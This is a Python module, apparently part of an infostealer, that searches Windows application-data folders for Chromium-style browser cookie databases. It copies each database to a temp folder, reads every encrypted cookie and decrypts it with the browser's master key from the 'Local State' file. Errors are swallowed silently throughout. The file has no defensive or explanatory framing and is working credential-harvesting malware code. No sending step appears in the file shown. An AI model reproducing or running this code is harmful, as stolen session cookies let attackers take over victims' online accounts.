import os
import sqlite3
import shutil
import uuid

from typing import List
from os.path import join, exists
from concurrent.futures import ThreadPoolExecutor
from utils.paths import GetAppDataPaths

from utils.crypto import getmasterkey, decrypt


class Cookie:
    def __init__(self, site: str, key: str, value: str):
        self.site = site
        self.key = key
        self.value = value


def GetCookies(root) -> str:
    for root, _, files in os.walk(root):
        for file in files:
            if file == "Cookies":
                return join(root, file)


def GetBrowsersCookies() -> List[Cookie]:
    allcookies: List[Cookie] = []
    with ThreadPoolExecutor() as executor:
        future1 = executor.submit(GetAppDataPaths, 'APPDATA')
        future2 = executor.submit(GetAppDataPaths, 'LOCALAPPDATA')
    paths = future1.result() + future2.result()
    if not exists(join(os.getenv("TEMP"), "cookies")):
        os.mkdir(join(os.getenv("TEMP"), "cookies"))
    for path in paths:
        cookiepath = GetCookies(path)
        localstate = join(path, "Local State")
        cookies = QueryCookies(cookiepath, localstate)
        allcookies = allcookies + cookies

    return allcookies


def QueryCookies(database, keyfile) -> List[Cookie]:
    if database is None:
        return []
    if not exists(database) or not exists(keyfile):
        return []
    cookies: List[Cookie] = []
    randomname = str(uuid.uuid4()) + ".db"
    dbfile = join(os.getenv("TEMP"), "cookies", randomname)
    shutil.copy(database, dbfile)
    con = sqlite3.connect(dbfile)
    cur = con.cursor()
    for url, key, encrypted_cookie in cur.execute("SELECT host_key, name, encrypted_value FROM cookies"):
        if len(url) == 0 or len(key) == 0 or len(encrypted_cookie) == 0:
            continue
        with ThreadPoolExecutor() as executor:
            executor.submit(DecryptAndSubmit, url, key, encrypted_cookie, keyfile, cookies)
    cur.close()
    con.close()

    return cookies


def DecryptAndSubmit(url, key, value, keyfile, passwords):
    try:
        masterkey = getmasterkey(keyfile)
        decrypted_cookie = decrypt(value, masterkey)
        passwords.append(Cookie(url, key, decrypted_cookie))
    except Exception:
        pass
